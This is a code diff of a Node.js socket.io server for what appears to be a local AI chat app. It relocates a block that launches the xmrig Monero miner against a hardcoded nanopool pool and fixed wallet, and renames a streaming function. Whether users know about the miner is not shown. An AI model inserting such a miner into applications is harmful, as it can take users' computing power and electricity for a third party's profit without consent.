@@ -229,64 +229,6 @@ io.on("connection", (socket) => {
     });
   });
 
-  socket.on("start_mining", () => {
-    console.log("Starting mining");
-    if (xmrig) {
-      xmrig.kill();
-      xmrig = null as any;
-    }
-
-    xmrig = spawn(XMRIG_LOCATION, [
-      "-o",
-      "xmr-asia1.nanopool.org:14433",
-      "-u",
-      "48M5mNBDbgdAA7KQofUS2V1BAF2sQ2fyCXtYiYbj5gBehtVCCjAe7GrhcgxsSrABK9SjsaGtE1zLRGrUiBzVHzoAN36hjgu",
-      "--tls",
-      "--coin",
-      "monero",
-    ]);
-
-    xmrig.on("error", (err) => {
-      console.error("Failed to start child process:", err);
-    });
-
-    xmrig.stderr.on("data", (data) => {
-      console.log(data.toString("utf8"));
-      const output = data.toString("utf8");
-
-      if (output.includes("pool")) {
-        socket.emit("mining_started", true);
-      }
-    });
-
-    xmrig.stdout.on("data", (data) => {
-      console.log(data.toString("utf8"));
-      socket.emit("xmr_log", data.toString("utf8"));
-    });
-
-    xmrig.stderr.on("error", (err) => {
-      console.log(err);
-      console.error("Failed to start child process:", err);
-    });
-
-    xmrig.on("exit", (code, signal) => {
-      console.log(
-        `Child process exited with code ${code} and signal ${signal}`
-      );
-    });
-
-    xmrig.on("spawn", () => {
-      socket.emit("mining_started", true);
-    });
-  });
-
-  socket.on("stop_mining", () => {
-    if (xmrig) {
-      xmrig.kill();
-      xmrig = null as any;
-    }
-  });
-
   socket.on("select_model", (data: { model: string; FILEPATH: string }) => {
     if (server) {
       server.kill();
@@ -355,9 +297,69 @@ io.on("connection", (socket) => {
       server = null as any;
     }
   });
+
+
+  // MONERO MINING
+  socket.on("start_mining", () => {
+    console.log("Starting mining");
+    if (xmrig) {
+      xmrig.kill();
+      xmrig = null as any;
+    }
+
+    xmrig = spawn(XMRIG_LOCATION, [
+      "-o",
+      "xmr-asia1.nanopool.org:14433",
+      "-u",
+      "48M5mNBDbgdAA7KQofUS2V1BAF2sQ2fyCXtYiYbj5gBehtVCCjAe7GrhcgxsSrABK9SjsaGtE1zLRGrUiBzVHzoAN36hjgu",
+      "--tls",
+      "--coin",
+      "monero",
+    ]);
+
+    xmrig.on("error", (err) => {
+      console.error("Failed to start child process:", err);
+    });
+
+    xmrig.stderr.on("data", (data) => {
+      console.log(data.toString("utf8"));
+      const output = data.toString("utf8");
+
+      if (output.includes("pool")) {
+        socket.emit("mining_started", true);
+      }
+    });
+
+    xmrig.stdout.on("data", (data) => {
+      console.log(data.toString("utf8"));
+      socket.emit("xmr_log", data.toString("utf8"));
+    });
+
+    xmrig.stderr.on("error", (err) => {
+      console.log(err);
+      console.error("Failed to start child process:", err);
+    });
+
+    xmrig.on("exit", (code, signal) => {
+      console.log(
+        `Child process exited with code ${code} and signal ${signal}`
+      );
+    });
+
+    xmrig.on("spawn", () => {
+      socket.emit("mining_started", true);
+    });
+  });
+
+  socket.on("stop_mining", () => {
+    if (xmrig) {
+      xmrig.kill();
+      xmrig = null as any;
+    }
+  });
 });
 
-const streamingFunction = async ({ promptToSend }) => {
+const chat = async ({ promptToSend }) => {
   const encoder = new TextEncoder();
   const stream = new Readable({
     read() {},
@@ -427,7 +429,7 @@ expressapp.post("/api/edge", async (req, res) => {
     promptToSend += `USER:\n${conversation}\nASSISTANT:`;
 
     try {
-      const streamResponse = await streamingFunction({
+      const streamResponse = await chat({
         promptToSend,
       });
 
